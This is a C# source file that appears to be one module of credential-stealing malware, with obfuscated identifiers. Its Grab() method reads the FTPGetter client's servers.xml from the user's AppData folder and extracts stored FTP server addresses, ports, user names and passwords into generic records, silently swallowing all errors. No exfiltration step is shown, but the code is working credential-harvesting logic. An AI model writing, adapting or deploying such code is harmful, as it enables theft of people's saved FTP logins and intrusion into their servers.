using System;
using System.Collections.Generic;
using System.IO;
using C6Zy;
using JSW1fecBOy;

namespace rk937aHHc
{
	public class FTPGetter : EtbH
	{
		public FTPGetter()
		{
			this.ApNUjiJpxC = "FTPGetter";
		}

		public string ApNUjiJpxC { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();

            string path = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"FTPGetter\servers.xml"
            );

            if (!File.Exists(path))
                return list;

            try
            {
                string content = File.ReadAllText(path);
                string[] servers = content.o1a9sIqIfKj("<server>");

                if (servers == null)
                    return list;

                foreach (string serverBlock in servers)
                {
                    string[] lines = serverBlock.o1a9sIqIfKj(Environment.NewLine);

                    WTitxI2m entry = new WTitxI2m();
                    entry.data4 = "FTPGetter";

                    foreach (string line in lines)
                    {
                        try
                        {
                            if (line.Contains("<server_ip>"))
                            {
                                string ip = g3Vt7T2gk5.Q4YnB9Kv(line, "<server_ip>", "</server_ip>");
                                string port = g3Vt7T2gk5.Q4YnB9Kv(line, "<server_port>", "</server_port>");
                                entry.data1 = $"{ip}:{port}";
                            }
                            else if (line.Contains("<server_user_name>"))
                            {
                                entry.data2 = g3Vt7T2gk5.Q4YnB9Kv(
                                    line,
                                    "<server_user_name>",
                                    "</server_user_name>"
                                );
                            }
                            else if (line.Contains("<server_user_password>"))
                            {
                                entry.data3 = g3Vt7T2gk5.Q4YnB9Kv(
                                    line,
                                    "<server_user_password>",
                                    "</server_user_password>"
                                );
                            }
                        }
                        catch
                        {
                        }
                    }

                    if (!string.IsNullOrEmpty(entry.data1) &&
                        !string.IsNullOrEmpty(entry.data2))
                    {
                        list.Add(entry);
                    }
                }
            }
            catch
            {
            }

            return list;
        }
    }
}
